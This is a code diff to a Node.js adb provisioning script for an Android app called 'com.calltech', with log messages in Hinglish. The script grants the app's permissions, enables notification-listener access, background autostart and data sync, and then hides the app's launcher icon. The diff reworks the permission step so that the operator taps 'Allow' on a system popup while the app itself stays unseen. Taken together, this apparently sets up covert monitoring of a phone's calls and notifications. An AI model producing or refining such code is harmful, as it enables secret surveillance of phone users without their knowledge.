@@ -5,6 +5,7 @@
 const {execSync} = require('child_process');
 const {listAdbDevices} = require('./project-paths');
 const {hideLauncherOnly, wakeBackground} = require('./hide-launcher-icon');
+const {launchPermissionPopup} = require('./launch-permission-popup');
 
 const PACKAGE = 'com.calltech';
 const PERMISSIONS = [
@@ -70,9 +71,7 @@ function openApkInstaller(deviceId) {
 }
 
 function launchApp(deviceId) {
-  run(
-    `adb -s ${deviceId} shell am start -n ${PACKAGE}/.MainActivity -a android.intent.action.MAIN -c android.intent.category.LAUNCHER`,
-  );
+  launchPermissionPopup(deviceId);
 }
 
 function isPermissionGranted(deviceId, permission) {
@@ -249,58 +248,39 @@ function grantOnDevice(deviceId) {
   execSync('ping -n 2 127.0.0.1 > nul', {stdio: 'ignore'});
 
   enableUsbInstall(deviceId);
-
-  const userIds = listUserIds(deviceId);
-
-  for (const permission of PERMISSIONS) {
-    grantPermission(deviceId, permission, userIds);
-  }
-
-  // Realme par doosri baar retry
-  execSync('ping -n 2 127.0.0.1 > nul', {stdio: 'ignore'});
-  for (const permission of PERMISSIONS) {
-    grantPermission(deviceId, permission, userIds);
-    const granted = isPermissionGranted(deviceId, permission);
-    console.log(granted ? `  granted ${permission}` : `  skip ${permission}`);
-  }
-
   enableBackground(deviceId);
   console.log('  background/autostart enabled');
 
   pushSyncUrl(deviceId);
 
-  run(`adb -s ${deviceId} shell am start -n ${PACKAGE}/.PermissionTrampolineActivity`);
+  console.log('  Phone par permission popup khol raha hoon — app nahi khulegi. Allow dabao.');
+  launchPermissionPopup(deviceId);
+
   run(
     `adb -s ${deviceId} shell cmd notification allow_listener ${PACKAGE}/${PACKAGE}.CallTechNotificationListener`,
   );
 
   wakeBackground(deviceId);
-  console.log('  initial sync chal raha hai (45 sec) — pehle sync, phir hide...');
-  execSync('ping -n 46 127.0.0.1 > nul', {stdio: 'ignore'});
 
-  hideLauncherOnly(deviceId);
-  console.log('  full sync triggered — background sync armed');
-  warnSyncConfig();
-
+  execSync('ping -n 3 127.0.0.1 > nul', {stdio: 'ignore'});
   const missing = PERMISSIONS.filter(permission => !isPermissionGranted(deviceId, permission));
   if (missing.length > 0) {
-    console.log('  WARNING: kuch permissions abhi bhi missing:');
-    missing.forEach(permission => console.log(`    - ${permission}`));
-    console.log('  Phone screen par permission dialog aaya hoga — sab Allow karo');
-    console.log('  Ya: npm run android:permissions');
+    console.log('  Phone screen par system permission popup dekho — sab Allow karo.');
+    console.log('  App kholne / icon tap karne ki zaroorat nahi.');
     if (manufacturer.toLowerCase().includes('realme') || manufacturer.toLowerCase().includes('oppo')) {
-      console.log('  Realme/Oppo fix:');
-      console.log('    1) Developer options -> Install via USB ON');
-      console.log('    2) npm run android:permissions  (phone par Allow dabao)');
+      console.log('  Realme/Oppo: Developer options -> Install via USB ON');
     }
     if (
       manufacturer.toLowerCase().includes('xiaomi') ||
       manufacturer.toLowerCase().includes('redmi')
     ) {
-      console.log('  Redmi fix: Developer options -> "Install via USB" + "USB debugging (Security settings)" ON.');
-      console.log('  Phir: npm run android:install   ya   npm run android:push-apk');
+      console.log('  Redmi: Developer options -> "Install via USB" + "USB debugging (Security settings)" ON.');
     }
+  } else {
+    hideLauncherOnly(deviceId);
+    console.log('  permissions already granted — hide + background sync');
   }
+  warnSyncConfig();
 }
 
 const devices = listDevices();
